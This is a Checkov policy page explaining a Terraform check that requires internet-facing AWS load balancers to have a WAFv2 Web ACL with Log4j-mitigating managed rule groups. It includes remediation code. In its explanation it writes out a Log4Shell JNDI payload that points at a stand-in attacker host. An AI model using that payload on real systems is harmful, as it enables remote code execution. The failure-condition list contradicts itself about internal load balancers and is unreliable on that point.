# CKV2_AWS_76: Ensure AWS ALB attached WAFv2 WebACL is configured with AMR for Log4j Vulnerability

## Severity
**HIGH** (score: 7.8/10)

An internet-facing ALB lacking a WAF rule set that blocks Log4Shell-style payloads leaves backend applications exposed to a well-known unauthenticated remote code execution vector.

## Summary
This check ensures that any internet-facing Application/Network Load Balancer has an AWS WAFv2 Web ACL attached, and that the Web ACL includes the AWS Managed Rules groups that specifically mitigate the Log4Shell (Log4j, CVE-2021-44228) exploitation vector.

## Applicability
- **IaC framework:** Terraform (graph-based check).
- **Resource types:** `aws_alb`, `aws_lb`, and `aws_wafv2_web_acl` (via their connection to `aws_wafv2_web_acl_association`).

## Why it matters
Log4Shell allowed remote code execution simply by getting a string like `${jndi:ldap://attacker.com/a}` logged by a vulnerable Log4j 2.x instance — commonly delivered via HTTP headers (User-Agent, X-Forwarded-For), query strings, or request bodies that reach an application behind a load balancer. AWS published two Managed Rule Groups directly targeted at this: `AWSManagedRulesKnownBadInputsRuleSet` (which includes Log4j-specific signatures) and `AWSManagedRulesAnonymousIpList` (which blocks anonymizing sources like Tor/VPN exit nodes commonly used in mass-exploitation scanning). A load balancer with no WAF, or a WAF that lacks these managed rule groups, has no automated protection against this class of injection attack reaching application servers — leaving remediation entirely dependent on patching every downstream service, which is slow and error-prone across large fleets.

## How Checkov evaluates this
Graph check (`ALBWebACLConfiguredWIthLog4jVulnerability.json`). It flags a load balancer as **failing** if any of these is true:
1. The load balancer's `internal` attribute is `true` (internal LBs are out of scope / considered lower risk and thus exempted from this check — meaning internal LBs always **pass**).
2. The load balancer (`aws_lb`/`aws_alb`) is **not** connected to any `aws_wafv2_web_acl_association` (no WAF attached at all).
3. The load balancer **is** connected to a WAFv2 association, and that association's Web ACL exists, but the ACL's rules do **not** include both:
   - a managed rule group statement named `AWSManagedRulesAnonymousIpList`, **and**
   - a managed rule group statement named `AWSManagedRulesKnownBadInputsRuleSet`.

PASS requires: the LB is internal, OR the LB has a WAFv2 Web ACL attached that includes both of the above managed rule groups.

## Non-compliant example
```hcl
resource "aws_lb" "public" {
  name               = "public-alb"
  internal           = false
  load_balancer_type = "application"
  subnets            = var.public_subnet_ids
}
# No aws_wafv2_web_acl_association at all -> fails
```

## Remediated example
```hcl
resource "aws_lb" "public" {
  name               = "public-alb"
  internal           = false
  load_balancer_type = "application"
  subnets            = var.public_subnet_ids
}

resource "aws_wafv2_web_acl" "log4j_protection" {
  name        = "log4j-protection"
  scope       = "REGIONAL"

  default_action {
    allow {}
  }

  rule {
    name     = "AWSManagedRulesKnownBadInputsRuleSet"
    priority = 1
    override_action { none {} }
    statement {
      managed_rule_group_statement {
        name        = "AWSManagedRulesKnownBadInputsRuleSet"
        vendor_name = "AWS"
      }
    }
    visibility_config {
      cloudwatch_metrics_enabled = true
      metric_name                = "known-bad-inputs"
      sampled_requests_enabled   = true
    }
  }

  rule {
    name     = "AWSManagedRulesAnonymousIpList"
    priority = 2
    override_action { none {} }
    statement {
      managed_rule_group_statement {
        name        = "AWSManagedRulesAnonymousIpList"
        vendor_name = "AWS"
      }
    }
    visibility_config {
      cloudwatch_metrics_enabled = true
      metric_name                = "anonymous-ip-list"
      sampled_requests_enabled   = true
    }
  }

  visibility_config {
    cloudwatch_metrics_enabled = true
    metric_name                = "log4j-protection"
    sampled_requests_enabled   = true
  }
}

resource "aws_wafv2_web_acl_association" "public_alb" {
  resource_arn = aws_lb.public.arn
  web_acl_arn  = aws_wafv2_web_acl.log4j_protection.arn
}
```

## Remediation steps
1. Attach an `aws_wafv2_web_acl_association` linking every internet-facing `aws_lb`/`aws_alb` to a WAFv2 Web ACL.
2. In that Web ACL, add both AWS Managed Rule Groups: `AWSManagedRulesKnownBadInputsRuleSet` and `AWSManagedRulesAnonymousIpList`.
3. For truly internal (non-internet-facing) load balancers, set `internal = true`, which exempts them from this check — but still consider WAF protection if the LB serves untrusted internal traffic.
4. WAFv2 Web ACLs for ALBs must use `scope = "REGIONAL"`; CloudFront-fronted resources use `scope = "CLOUDFRONT"` in `us-east-1`.
5. Managed rule groups incur additional WCU (Web ACL Capacity Units) cost/limits — verify your Web ACL's capacity budget accommodates both groups plus any custom rules.
6. This check is a point-in-time proxy for Log4Shell defense-in-depth; it does not replace patching Log4j itself in application dependencies.

## References
- [Checkov check source](https://github.com/bridgecrewio/checkov/blob/main/checkov/terraform/checks/graph_checks/aws/ALBWebACLConfiguredWIthLog4jVulnerability.json)
- [AWS: Baseline Rule Groups for AWS WAF](https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups-baseline.html)
- [AWS: Mitigating the Log4j vulnerability with AWS WAF](https://aws.amazon.com/blogs/security/how-to-use-aws-waf-to-mitigate-the-log4j-vulnerability/)
